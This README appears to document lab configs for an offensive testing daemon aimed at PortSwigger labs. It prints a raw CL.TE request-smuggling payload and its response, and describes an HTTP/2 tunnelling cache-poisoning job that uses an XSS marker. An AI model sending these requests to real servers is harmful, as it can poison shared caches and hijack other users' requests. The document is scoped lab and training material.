# Daemon lab configs

## HTTP request smuggling, basic CL.TE

- `config.lab.json` — transport: trusted tier, direct egress, scope locked to
  one lab host on port 443.
- `daemon.json` — one job, `smuggle-chain`, success marker
  `Unrecognized method GPOST`.

Run:

```bash
go run ./cmd/omnislashd -config examples/daemon/daemon.json -once
```

The daemon writes one JSON object per attempt to `lab-clte.jsonl` (gitignored)
and prints a summary. Exit code is 0 only when the job reached its marker.

## Web cache poisoning via HTTP/2 request tunnelling

- `config.cache-tunnel.json` — transport for the H2 lab.
- `daemon-cache-tunnel.json` — one `h2-tunnel` job with `tls: "h2"`, marker
  `<script>alert(1)</script>` and `success_finding: "cache_poisoned"`.

```bash
go run ./cmd/omnislashd -config examples/daemon/daemon-cache-tunnel.json -once
```

The probe sends a HEAD request whose `:path` value contains a complete second
request plus large static padding requests. The front-end downgrades to
HTTP/1.1, over-reads the tunnelled responses into the HEAD body, and caches the
mixed response under `/`. A following normal `GET /` must return the marker;
only then does the job succeed (`h2_tunnel_confirmed` plus `cache_poisoned`).

## What the probe does

The lab front-end honours `Content-Length`; the back-end honours
`Transfer-Encoding: chunked`. The probe sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end forwards six bytes (`0\r\n\r\nG`). The back-end sees the zero
chunk, ends the body, and keeps `G` in its connection buffer. The probe then
opens a second connection (same pinned session, same egress) and sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 0
```

The back-end prepends the leftover byte and parses `GPOST / HTTP/1.1`, so the
response is:

```http
HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"
```

That is the lab objective. `SmuggleChainProbe` reports `smuggle_confirmed`
with high confidence and waits for `attempts` tries, because the front-end's
back-end pool may need a few attempts before the victim lands on the poisoned
socket.

## Replacing an expired instance

PortSwigger lab instances are disposable. If the host no longer responds,
start a fresh instance of the same lab and update:

- `allow_hosts` in the matching transport config (`config.lab.json` or
  `config.cache-tunnel.json`);
- `target.addr` and `target.host` in the matching daemon config
  (`daemon.json` or `daemon-cache-tunnel.json`).

Only run this against your own lab instance.
